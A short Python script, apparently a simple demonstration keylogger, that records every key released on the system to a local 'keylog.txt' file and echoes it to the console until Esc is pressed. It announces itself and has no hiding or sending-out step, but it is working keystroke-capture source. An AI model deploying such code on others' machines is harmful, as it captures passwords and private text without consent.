import keyboard

log_file = "keylog.txt"

def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(key)

def on_key_event(e):
    key = e.name
    if len(key) > 1:
    
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{key}]"
    write_to_log(key)
    print(key, end='', flush=True)  

def main():
    print("Keylogger started. Press 'Esc' to exit.")
    keyboard.on_release(on_key_event)
    keyboard.wait("esc")
    print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()
